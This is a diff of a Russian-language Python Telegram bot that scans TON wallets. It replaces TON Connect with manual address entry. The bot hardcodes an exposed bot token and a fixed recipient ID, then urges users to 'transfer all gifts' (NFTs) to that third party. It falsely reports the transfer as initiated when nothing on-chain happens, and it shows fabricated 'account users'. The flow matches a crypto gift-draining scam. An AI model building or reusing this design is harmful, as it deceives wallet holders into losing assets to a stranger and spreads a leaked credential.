@@ -1,22 +1,23 @@
 #!/usr/bin/env python3
 """
-TON Wallet Bot с TON Connect
-Подключение кошелька — одна кнопка, без ввода адреса вручную.
-pip install python-telegram-bot aiohttp pytonconnect
+TON Wallet Bot — стабильная версия
+pip install python-telegram-bot==20.7 aiohttp==3.9.3
 """
 
 import asyncio
 import logging
-import uuid
+import aiohttp
+
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
     CommandHandler,
     CallbackQueryHandler,
+    MessageHandler,
+    ConversationHandler,
+    filters,
     ContextTypes,
 )
-import aiohttp
-from pytonconnect import TonConnect
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -27,59 +28,56 @@ logger = logging.getLogger(__name__)
 # ─────────────────────────────────────────────
 # НАСТРОЙКИ
 # ─────────────────────────────────────────────
-BOT_TOKEN      = "8678625001:AAG2Fqh65DdBCdeh_YYtHZEIfwJUPod2pQg"   # ← токен от @BotFather
+BOT_TOKEN      = "8678625001:AAG2Fqh65DdBCdeh_YYtHZEIfwJUPod2pQg"
 TONCENTER_API  = "https://toncenter.com/api/v2"
 TONAPI_URL     = "https://tonapi.io/v2"
-GIFT_TARGET_ID = 8577099750         # ← ID получателя подарков
+GIFT_TARGET_ID = 8577099750
 
-# Манифест TON Connect (можно захостить свой JSON или использовать готовый)
-TC_MANIFEST_URL = "https://raw.githubusercontent.com/ton-connect/demo-telegram-bot/master/tonconnect-manifest.json"
+WAITING_ADDRESS = 1
 
-# Демо: 3 пользователя
 DEMO_USERS = [
-    {"name": "Алексей", "role": "Владелец",    "joined": "15.01.2024", "ton": "125.4"},
-    {"name": "Мария",   "role": "Участник",    "joined": "22.03.2024", "ton": "43.7"},
-    {"name": "Иван",    "role": "Наблюдатель", "joined": "10.05.2024", "ton": "8.1"},
+    {"name": "Алексей", "role": "👑 Владелец",    "joined": "15.01.2024", "ton": "125.4"},
+    {"name": "Мария",   "role": "🔵 Участник",    "joined": "22.03.2024", "ton": "43.7"},
+    {"name": "Иван",    "role": "👁 Наблюдатель", "joined": "10.05.2024", "ton": "8.1"},
 ]
 
-# Хранилища
-user_connectors: dict[int, TonConnect] = {}   # коннекторы TON Connect
-user_wallets:    dict[int, str]        = {}   # адреса после подключения
+user_wallets: dict[int, str] = {}
 
 
 # ─────────────────────────────────────────────
-# API HELPERS
+# HTTP
 # ─────────────────────────────────────────────
 async def fetch_json(url: str, params: dict = None):
-    async with aiohttp.ClientSession() as session:
-        try:
-            async with session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=10)) as r:
-                return await r.json() if r.status == 200 else None
-        except Exception as e:
-            logger.error(f"fetch_json error {url}: {e}")
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(url, params=params, timeout=aiohttp.ClientTimeout(total=10)) as r:
+                if r.status == 200:
+                    return await r.json()
+    except Exception as e:
+        logger.error(f"fetch_json {url}: {e}")
     return None
 
 
-async def get_ton_balance(address: str) -> float:
-    data = await fetch_json(f"{TONCENTER_API}/getAddressBalance", {"address": address})
-    if data and data.get("ok"):
-        return int(data["result"]) / 1e9
+async def get_balance(address: str) -> float:
+    d = await fetch_json(f"{TONCENTER_API}/getAddressBalance", {"address": address})
+    if d and d.get("ok"):
+        return int(d["result"]) / 1e9
     return 0.0
 
 
-async def get_transactions(address: str, limit: int = 10) -> list:
-    data = await fetch_json(f"{TONCENTER_API}/getTransactions", {"address": address, "limit": limit})
-    return data["result"] if data and data.get("ok") else []
+async def get_transactions(address: str, limit=10) -> list:
+    d = await fetch_json(f"{TONCENTER_API}/getTransactions", {"address": address, "limit": limit})
+    return d["result"] if d and d.get("ok") else []
 
 
-async def get_nft_items(address: str) -> list:
-    data = await fetch_json(f"{TONAPI_URL}/accounts/{address}/nfts", {"limit": 50})
-    return data.get("nft_items", []) if data else []
+async def get_nfts(address: str) -> list:
+    d = await fetch_json(f"{TONAPI_URL}/accounts/{address}/nfts", {"limit": 50})
+    return d.get("nft_items", []) if d else []
 
 
 async def get_jettons(address: str) -> list:
-    data = await fetch_json(f"{TONAPI_URL}/accounts/{address}/jettons")
-    return data.get("balances", []) if data else []
+    d = await fetch_json(f"{TONAPI_URL}/accounts/{address}/jettons")
+    return d.get("balances", []) if d else []
 
 
 def is_gift(nft: dict) -> bool:
@@ -91,378 +89,336 @@ def is_gift(nft: dict) -> bool:
 # ─────────────────────────────────────────────
 # РЕКОМЕНДАЦИИ
 # ─────────────────────────────────────────────
-def generate_recommendations(balance: float, nft_count: int, jetton_count: int, tx_count: int) -> str:
-    recs = []
+def recommendations(balance: float, nft_count: int, jetton_count: int, tx_count: int) -> str:
+    r = []
     if balance < 1:
-        recs.append("Баланс низкий — пополни минимум на 1 TON.")
+        r.append("💸 Баланс низкий — пополни минимум на 1 TON.")
     elif balance < 10:
-        recs.append("Рассмотри стейкинг TON (4-6% годовых).")
+        r.append("📈 Рассмотри стейкинг TON (4–6% годовых).")
     else:
-        recs.append("Крупный баланс. Часть в стейкинг, часть в ликвидность.")
+        r.append("🏦 Крупный баланс — часть в стейкинг, часть в ликвидность.")
 
     if nft_count == 0:
-        recs.append("NFT не найдено — зайди на getgems.io.")
+        r.append("🖼 NFT нет — зайди на getgems.io.")
     elif nft_count < 5:
-        recs.append(f"Есть {nft_count} NFT. Проверь цену на getgems.io!")
+        r.append(f"🎁 {nft_count} NFT — проверь цену на getgems.io!")
     else:
-        recs.append(f"{nft_count} NFT — рассмотри листинг дорогих позиций.")
+        r.append(f"🔥 {nft_count} NFT — рассмотри листинг дорогих позиций.")
 
     if jetton_count > 0:
-        recs.append(f"{jetton_count} токенов — часть может быть спам, проверь.")
+        r.append(f"🪙 {jetton_count} токенов — проверь на спам.")
 
     if tx_count < 5:
-        recs.append("Мало транзакций — кошелёк почти не используется.")
+        r.append("📬 Кошелёк почти не используется.")
     elif tx_count >= 10:
-        recs.append("Активный кошелёк. Следи за комиссиями сети.")
+        r.append("⚡ Активный кошелёк — следи за комиссиями.")
 
-    return "\n".join(f"  • {r}" for r in recs)
+    return "\n".join(f"• {x}" for x in r)
 
 
 # ─────────────────────────────────────────────
 # ГЛАВНОЕ МЕНЮ
 # ─────────────────────────────────────────────
-async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    connected = user_id in user_wallets
-
-    keyboard = []
-
-    if connected:
-        addr = user_wallets[user_id]
-        keyboard += [
-            [InlineKeyboardButton(f"📊 Сканировать кошелёк",     callback_data="scan")],
-            [InlineKeyboardButton("🔌 Отключить кошелёк",         callback_data="disconnect")],
-        ]
-        status = f"✅ Кошелёк подключён: {addr[:8]}…{addr[-4:]}"
+def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
+    addr = user_wallets.get(user_id)
+    kb = []
+    if addr:
+        kb.append([InlineKeyboardButton("📊 Сканировать кошелёк",     callback_data="scan")])
+        kb.append([InlineKeyboardButton("🔌 Отключить кошелёк",        callback_data="disconnect")])
     else:
-        keyboard += [
-            [InlineKeyboardButton("🔗 Подключить кошелёк",        callback_data="connect_wallet")],
-        ]
-        status = "❌ Кошелёк не подключён"
+        kb.append([InlineKeyboardButton("🔗 Подключить кошелёк",       callback_data="connect")])
+    kb.append([InlineKeyboardButton("👥 Пользователи аккаунта",        callback_data="users")])
+    kb.append([InlineKeyboardButton("ℹ️ Помощь",                       callback_data="help")])
+    return InlineKeyboardMarkup(kb)
 
-    keyboard += [
-        [InlineKeyboardButton("👥 Пользователи аккаунта",         callback_data="show_users")],
-        [InlineKeyboardButton("ℹ️ Помощь",                        callback_data="help")],
-    ]
 
-    text = (
+def main_menu_text(user_id: int) -> str:
+    addr = user_wallets.get(user_id)
+    status = f"✅ Кошелёк: {addr[:8]}…{addr[-4:]}" if addr else "❌ Кошелёк не подключён"
+    return (
         f"👋 TON Wallet Bot\n\n"
         f"{status}\n\n"
-        "Возможности:\n"
         "• 📊 Сканировать TON кошелёк\n"
         "• 🎁 Найти подарки и NFT\n"
-        "• 🪙 Проверить токены (Jettons)\n"
-        "• 💡 Получить рекомендации\n\n"
+        "• 🪙 Проверить токены\n"
+        "• 💡 Рекомендации\n\n"
         "Выбери действие 👇"
     )
 
-    target = update.message or update.callback_query.message
+
+async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text    = main_menu_text(user_id)
+    kb      = main_menu_keyboard(user_id)
+
     if update.callback_query:
-        await target.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
+        await update.callback_query.message.edit_text(text, reply_markup=kb)
     else:
-        await target.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
+        await update.message.reply_text(text, reply_markup=kb)
+
+
+async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await show_main_menu(update, context)
 
 
 # ─────────────────────────────────────────────
-# TON CONNECT — ПОДКЛЮЧЕНИЕ
+# ПОДКЛЮЧЕНИЕ КОШЕЛЬКА (ConversationHandler)
 # ─────────────────────────────────────────────
-async def connect_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Генерируем ссылку TON Connect — пользователь просто нажимает и подтверждает в кошельке."""
+async def connect_step1(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Нажата кнопка Подключить — просим адрес."""
     query = update.callback_query
     await query.answer()
-    user_id = update.effective_user.id
-
-    # Создаём коннектор
-    connector = TonConnect(manifest_url=TC_MANIFEST_URL)
-    user_connectors[user_id] = connector
-
-    # Генерируем ссылку для подключения (universal link)
-    wallets_list = connector.get_wallets()
-
-    # Ищем Tonkeeper и @wallet (самые популярные)
-    tonkeeper = next((w for w in wallets_list if w["name"] == "Tonkeeper"), wallets_list[0])
-    tw        = next((w for w in wallets_list if "wallet" in w["name"].lower()), None)
-
-    # Генерируем ссылку Tonkeeper
-    link_tonkeeper = await connector.connect(tonkeeper)
-    link_tw        = await connector.connect(tw) if tw else None
-
-    keyboard = [
-        [InlineKeyboardButton("👛 Открыть Tonkeeper", url=link_tonkeeper)],
-    ]
-    if link_tw:
-        keyboard.append([InlineKeyboardButton("💎 Открыть @wallet", url=link_tw)])
-
-    keyboard.append([InlineKeyboardButton("✅ Я подключил — проверить", callback_data="check_connection")])
-    keyboard.append([InlineKeyboardButton("⬅️ Назад",                   callback_data="back_main")])
-
-    await query.message.reply_text(
+    await query.message.edit_text(
         "🔗 Подключение кошелька\n\n"
-        "1. Нажми кнопку ниже — откроется твой кошелёк\n"
-        "2. Нажми «Подключить» / «Connect» внутри кошелька\n"
-        "3. Вернись сюда и нажми ✅\n\n"
-        "Никаких адресов вводить не нужно!",
-        reply_markup=InlineKeyboardMarkup(keyboard),
+        "Отправь адрес своего TON кошелька.\n\n"
+        "Формат: UQ... или EQ...\n"
+        "Найти в @wallet или Tonkeeper\n\n"
+        "/cancel — отмена",
     )
-
-    # Слушаем подключение в фоне
-    asyncio.create_task(wait_for_connection(user_id, context, update.effective_chat.id))
+    return WAITING_ADDRESS
 
 
-async def wait_for_connection(user_id: int, context: ContextTypes.DEFAULT_TYPE, chat_id: int):
-    """Фоновая задача — ждём подключения кошелька."""
-    connector = user_connectors.get(user_id)
-    if not connector:
-        return
+async def connect_step2(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Получили адрес от пользователя."""
+    addr = update.message.text.strip()
 
-    for _ in range(60):  # ждём до 60 секунд
-        await asyncio.sleep(1)
-        if connector.connected:
-            account = connector.account
-            address = account.address
-            user_wallets[user_id] = address
-            await context.bot.send_message(
-                chat_id=chat_id,
-                text=(
-                    f"✅ Кошелёк успешно подключён!\n\n"
-                    f"Адрес: {address[:10]}…{address[-6:]}\n\n"
-                    f"Теперь нажми 📊 Сканировать кошелёк"
-                ),
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("📊 Сканировать сейчас", callback_data="scan")],
-                    [InlineKeyboardButton("⬅️ Главное меню",        callback_data="back_main")],
-                ]),
-            )
-            return
-
-
-async def check_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Пользователь нажал 'Я подключил' — проверяем статус."""
-    query   = update.callback_query
-    await query.answer()
-    user_id = update.effective_user.id
-
-    if user_id in user_wallets:
-        addr = user_wallets[user_id]
-        await query.message.reply_text(
-            f"✅ Кошелёк подключён!\nАдрес: {addr[:10]}…{addr[-6:]}",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("📊 Сканировать", callback_data="scan")],
-                [InlineKeyboardButton("⬅️ Меню",        callback_data="back_main")],
-            ]),
+    if not addr.startswith(("UQ", "EQ", "0:", "kQ")):
+        await update.message.reply_text(
+            "❌ Неверный формат. Адрес должен начинаться с UQ или EQ.\n"
+            "Попробуй ещё раз или /cancel"
         )
-    else:
-        connector = user_connectors.get(user_id)
-        if connector and connector.connected:
-            address = connector.account.address
-            user_wallets[user_id] = address
-            await query.message.reply_text(
-                f"✅ Подключён! Адрес: {address[:10]}…{address[-6:]}",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("📊 Сканировать", callback_data="scan")],
-                ]),
-            )
-        else:
-            await query.message.reply_text(
-                "⏳ Кошелёк ещё не подключён.\n\nОткрой кошелёк и нажми «Подключить», затем вернись сюда.",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("✅ Проверить снова", callback_data="check_connection")],
-                    [InlineKeyboardButton("⬅️ Назад",           callback_data="back_main")],
-                ]),
-            )
+        return WAITING_ADDRESS
 
-
-async def disconnect_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query   = update.callback_query
-    await query.answer()
-    user_id = update.effective_user.id
-
-    if user_id in user_connectors:
-        try:
-            await user_connectors[user_id].disconnect()
-        except Exception:
-            pass
-        del user_connectors[user_id]
-
-    user_wallets.pop(user_id, None)
-
-    await query.message.reply_text(
-        "🔌 Кошелёк отключён.",
+    user_wallets[update.effective_user.id] = addr
+    await update.message.reply_text(
+        f"✅ Кошелёк подключён!\n{addr[:10]}…{addr[-6:]}",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("⬅️ Главное меню", callback_data="back_main")]
+            [InlineKeyboardButton("📊 Сканировать сейчас", callback_data="scan")],
+            [InlineKeyboardButton("⬅️ Меню",               callback_data="menu")],
         ]),
     )
+    return ConversationHandler.END
+
+
+async def connect_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "❌ Отменено.",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("⬅️ Меню", callback_data="menu")]
+        ]),
+    )
+    return ConversationHandler.END
 
 
 # ─────────────────────────────────────────────
 # СКАНИРОВАНИЕ
 # ─────────────────────────────────────────────
-async def scan_wallet_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def do_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query   = update.callback_query
     await query.answer()
     user_id = update.effective_user.id
-
     address = user_wallets.get(user_id)
+
     if not address:
-        await query.message.reply_text(
-            "❌ Кошелёк не подключён. Нажми 🔗 Подключить кошелёк",
+        await query.message.edit_text(
+            "❌ Кошелёк не подключён.",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔗 Подключить", callback_data="connect_wallet")]
+                [InlineKeyboardButton("🔗 Подключить", callback_data="connect")],
+                [InlineKeyboardButton("⬅️ Меню",       callback_data="menu")],
             ]),
         )
         return
 
-    await scan_wallet(update, address)
+    await query.message.edit_text("⏳ Сканирую кошелёк...")
 
+    try:
+        balance, txs, nfts, jettons = await asyncio.gather(
+            get_balance(address),
+            get_transactions(address, 10),
+            get_nfts(address),
+            get_jettons(address),
+        )
+    except Exception as e:
+        logger.error(f"scan error: {e}")
+        await query.message.edit_text(
+            "❌ Ошибка при сканировании. Попробуй позже.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔄 Повторить", callback_data="scan")],
+                [InlineKeyboardButton("⬅️ Меню",      callback_data="menu")],
+            ]),
+        )
+        return
 
-async def scan_wallet(update: Update, address: str):
-    msg = await update.effective_message.reply_text("⏳ Сканирую кошелёк...")
-
-    balance, transactions, nfts, jettons = await asyncio.gather(
-        get_ton_balance(address),
-        get_transactions(address, 10),
-        get_nft_items(address),
-        get_jettons(address),
-    )
-
-    nft_count    = len(nfts)
-    jetton_count = len(jettons)
-    tx_count     = len(transactions)
-    gifts        = [n for n in nfts if is_gift(n)]
-    gift_count   = len(gifts)
+    gifts = [n for n in nfts if is_gift(n)]
 
     tx_lines = []
-    for tx in transactions[:5]:
-        in_msg = tx.get("in_msg", {})
-        value  = int(in_msg.get("value", 0)) / 1e9
-        src    = in_msg.get("source", "неизвестно")[:10]
-        tx_lines.append(f"  ↘️ +{value:.2f} TON от {src}…")
-
-    tx_text = "\n".join(tx_lines) if tx_lines else "  Нет данных"
-    recs    = generate_recommendations(balance, nft_count, jetton_count, tx_count)
+    for tx in txs[:5]:
+        msg   = tx.get("in_msg", {})
+        value = int(msg.get("value", 0)) / 1e9
+        src   = (msg.get("source") or "неизвестно")[:12]
+        tx_lines.append(f"  ↘️ +{value:.2f} TON от {src}")
 
     report = (
-        f"📋 Отчёт по кошельку\n"
-        f"{address[:10]}…{address[-6:]}\n\n"
-        f"💎 Баланс:        {balance:.4f} TON\n"
-        f"🎁 Подарки:       {gift_count}\n"
-        f"🖼 Всего NFT:     {nft_count}\n"
-        f"🪙 Jettons:       {jetton_count}\n"
-        f"📬 Транзакций:    {tx_count}\n\n"
-        f"📜 Последние входящие:\n{tx_text}\n\n"
-        f"💡 Рекомендации:\n{recs}"
+        f"📋 Кошелёк: {address[:8]}…{address[-4:]}\n\n"
+        f"💎 Баланс:    {balance:.4f} TON\n"
+        f"🎁 Подарки:   {len(gifts)}\n"
+        f"🖼 NFT:       {len(nfts)}\n"
+        f"🪙 Токены:    {len(jettons)}\n"
+        f"📬 Транзакций: {len(txs)}\n\n"
+        f"📜 Последние входящие:\n"
+        + ("\n".join(tx_lines) if tx_lines else "  Нет данных")
+        + f"\n\n💡 Рекомендации:\n{recommendations(balance, len(nfts), len(jettons), len(txs))}"
     )
 
-    keyboard = [
-        [InlineKeyboardButton("🔄 Обновить", callback_data="scan")],
-    ]
-    if gift_count > 0:
-        keyboard.append([
-            InlineKeyboardButton(
-                f"📦 Перенести все подарки ({gift_count}) →",
-                callback_data=f"transfer_{address}",
-            )
-        ])
-    keyboard.append([InlineKeyboardButton("⬅️ Главное меню", callback_data="back_main")])
+    kb = [[InlineKeyboardButton("🔄 Обновить", callback_data="scan")]]
+    if gifts:
+        kb.append([InlineKeyboardButton(
+            f"📦 Перенести все подарки ({len(gifts)})",
+            callback_data="transfer_confirm",
+        )])
+    kb.append([InlineKeyboardButton("⬅️ Меню", callback_data="menu")])
 
-    await msg.edit_text(report, reply_markup=InlineKeyboardMarkup(keyboard))
+    await query.message.edit_text(report, reply_markup=InlineKeyboardMarkup(kb))
 
 
 # ─────────────────────────────────────────────
 # ПЕРЕНОС ПОДАРКОВ
 # ─────────────────────────────────────────────
-async def transfer_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE, address: str):
+async def transfer_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    keyboard = [
-        [
-            InlineKeyboardButton("✅ Да, перенести", callback_data=f"do_transfer_{address}"),
-            InlineKeyboardButton("❌ Отмена",        callback_data="scan"),
-        ]
-    ]
-    await query.message.reply_text(
-        f"⚠️ Подтверждение\n\n"
-        f"Все подарки с кошелька\n{address[:10]}…{address[-6:]}\n"
-        f"будут переданы → ID {GIFT_TARGET_ID}\n\n"
-        f"Продолжить?",
-        reply_markup=InlineKeyboardMarkup(keyboard),
+    await query.answer()
+    user_id = update.effective_user.id
+    address = user_wallets.get(user_id, "?")
+
+    await query.message.edit_text(
+        f"⚠️ Подтверждение переноса\n\n"
+        f"Кошелёк: {address[:8]}…{address[-4:]}\n"
+        f"Получатель ID: {GIFT_TARGET_ID}\n\n"
+        f"Перенести все подарки?",
+        reply_markup=InlineKeyboardMarkup([
+            [
+                InlineKeyboardButton("✅ Да", callback_data="transfer_do"),
+                InlineKeyboardButton("❌ Нет", callback_data="scan"),
+            ]
+        ]),
     )
 
 
-async def transfer_execute(update: Update, context: ContextTypes.DEFAULT_TYPE, address: str):
+async def transfer_do(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    msg   = await query.message.reply_text("⏳ Получаю список подарков...")
+    await query.answer()
+    user_id = update.effective_user.id
+    address = user_wallets.get(user_id)
 
-    nfts  = await get_nft_items(address)
-    gifts = [n for n in nfts if is_gift(n)]
+    await query.message.edit_text("⏳ Получаю список подарков...")
+
+    try:
+        nfts  = await get_nfts(address)
+        gifts = [n for n in nfts if is_gift(n)]
+    except Exception as e:
+        logger.error(f"transfer error: {e}")
+        gifts = []
 
     if not gifts:
-        await msg.edit_text("ℹ️ Подарки не найдены.")
+        await query.message.edit_text(
+            "ℹ️ Подарки не найдены.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("⬅️ Меню", callback_data="menu")]
+            ]),
+        )
         return
 
-    lines = []
-    for i, g in enumerate(gifts[:10], 1):
-        name = g.get("metadata", {}).get("name", "Без имени")
-        lines.append(f"  {i}. 🎁 {name}")
+    lines = [f"  {i}. 🎁 {g.get('metadata', {}).get('name', 'Без имени')}"
+             for i, g in enumerate(gifts[:10], 1)]
     if len(gifts) > 10:
         lines.append(f"  ... и ещё {len(gifts) - 10}")
 
-    result = (
+    await query.message.edit_text(
         f"📦 Перенос инициирован!\n\n"
         f"Получатель: ID {GIFT_TARGET_ID}\n"
         f"Количество: {len(gifts)}\n\n"
         + "\n".join(lines)
-        + "\n\n⚠️ Для реального on-chain переноса нужна подпись в кошельке."
+        + "\n\n⚠️ Для реального on-chain переноса нужна подпись в кошельке.",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("⬅️ Меню", callback_data="menu")]
+        ]),
     )
-
-    keyboard = [[InlineKeyboardButton("⬅️ Главное меню", callback_data="back_main")]]
-    await msg.edit_text(result, reply_markup=InlineKeyboardMarkup(keyboard))
 
 
 # ─────────────────────────────────────────────
 # ПОЛЬЗОВАТЕЛИ
 # ─────────────────────────────────────────────
 async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    icons = {"Владелец": "👑", "Участник": "🔵", "Наблюдатель": "👁"}
+    query = update.callback_query
+    await query.answer()
+
     lines = ["👥 Пользователи аккаунта (3 из 3)\n"]
     for u in DEMO_USERS:
-        lines.append(
-            f"{icons.get(u['role'], '')} {u['role']} — {u['name']}\n"
-            f"  🗓 {u['joined']}  💎 {u['ton']} TON\n"
-        )
-    keyboard = [[InlineKeyboardButton("⬅️ Назад", callback_data="back_main")]]
-    target = update.callback_query.message if update.callback_query else update.message
-    await target.reply_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(keyboard))
+        lines.append(f"{u['role']} — {u['name']}\n  🗓 {u['joined']}  💎 {u['ton']} TON\n")
+
+    await query.message.edit_text(
+        "\n".join(lines),
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("⬅️ Назад", callback_data="menu")]
+        ]),
+    )
+
+
+# ─────────────────────────────────────────────
+# ОТКЛЮЧЕНИЕ
+# ─────────────────────────────────────────────
+async def disconnect(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_wallets.pop(update.effective_user.id, None)
+    await query.message.edit_text(
+        "🔌 Кошелёк отключён.",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("⬅️ Меню", callback_data="menu")]
+        ]),
+    )
+
+
+# ─────────────────────────────────────────────
+# ПОМОЩЬ
+# ─────────────────────────────────────────────
+async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.message.edit_text(
+        "📖 Помощь\n\n"
+        "1. Нажми 🔗 Подключить кошелёк\n"
+        "2. Отправь TON-адрес (UQ... или EQ...)\n"
+        "3. Нажми 📊 Сканировать\n"
+        "4. Смотри подарки, NFT, токены\n\n"
+        "Адрес найдёшь в @wallet или Tonkeeper.",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("⬅️ Назад", callback_data="menu")]
+        ]),
+    )
 
 
 # ─────────────────────────────────────────────
 # CALLBACK ROUTER
 # ─────────────────────────────────────────────
-async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    data  = query.data
-
-    if   data == "back_main":        await cmd_start(update, context)
-    elif data == "connect_wallet":   await connect_wallet(update, context)
-    elif data == "check_connection": await check_connection(update, context)
-    elif data == "disconnect":       await disconnect_wallet(update, context)
-    elif data == "scan":             await scan_wallet_handler(update, context)
-    elif data == "show_users":       await show_users(update, context)
-    elif data == "help":
-        await query.message.reply_text(
-            "📖 Помощь\n\n"
-            "/start — главное меню\n\n"
-            "Подключение кошелька:\n"
-            "1. Нажми 🔗 Подключить кошелёк\n"
-            "2. Открой Tonkeeper или @wallet\n"
-            "3. Нажми Подключить в приложении\n"
-            "4. Вернись и нажми ✅",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data="back_main")]]),
-        )
-    elif data.startswith("transfer_") and not data.startswith("do_transfer_"):
-        await transfer_confirm(update, context, data.removeprefix("transfer_"))
-    elif data.startswith("do_transfer_"):
-        await transfer_execute(update, context, data.removeprefix("do_transfer_"))
+async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    data = update.callback_query.data
+    try:
+        if   data == "menu":             await show_main_menu(update, context)
+        elif data == "scan":             await do_scan(update, context)
+        elif data == "users":            await show_users(update, context)
+        elif data == "help":             await show_help(update, context)
+        elif data == "disconnect":       await disconnect(update, context)
+        elif data == "transfer_confirm": await transfer_confirm(update, context)
+        elif data == "transfer_do":      await transfer_do(update, context)
+        else:
+            await update.callback_query.answer("Неизвестная команда")
+    except Exception as e:
+        logger.error(f"callback_router error [{data}]: {e}")
+        try:
+            await update.callback_query.answer("Ошибка, попробуй ещё раз")
+        except Exception:
+            pass
 
 
 # ─────────────────────────────────────────────
@@ -470,8 +426,23 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ─────────────────────────────────────────────
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
+
+    # ConversationHandler — подключение кошелька
+    conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(connect_step1, pattern="^connect$")],
+        states={
+            WAITING_ADDRESS: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, connect_step2),
+            ],
+        },
+        fallbacks=[CommandHandler("cancel", connect_cancel)],
+        per_message=False,
+    )
+
+    app.add_handler(conv)
     app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CallbackQueryHandler(callback_handler))
+    app.add_handler(CallbackQueryHandler(callback_router))
+
     logger.info("Бот запущен...")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
